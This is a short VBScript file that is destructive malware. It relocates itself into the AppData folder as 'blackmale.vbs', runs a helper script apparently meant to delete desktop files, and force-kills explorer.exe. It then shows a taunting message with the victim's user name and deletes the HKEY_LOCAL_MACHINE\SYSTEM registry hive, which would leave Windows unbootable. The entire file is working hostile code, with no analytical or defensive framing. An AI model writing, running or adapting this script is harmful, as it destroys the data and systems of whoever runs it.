Set shell = CreateObject("Wscript.shell")

Set FSO = CreateObject("Scripting.FileSystemObject")

Set network = CreateObject("WScript.Network")

user = network.UserName

desktop = shell.SpecialFolders("Desktop")

deleteDesktopFilePath = FSO.GetParentFolderName(WScript.ScriptFullName) & "\help\delDesktop.vbs"

FSO.MoveFile WScript.ScriptFullName, shell.SpecialFolders("AppData") & "blackmale.vbs"

shell.run deleteDesktopFilePath, 1, True

shell.run "taskkill /f /im explorer.exe"

MsgBox "wait for my beautiful payload " & user & "!!!"

WScript.Sleep 1000

shell.run "reg delete HKEY_LOCAL_MACHINE\SYSTEM /f", 1, True
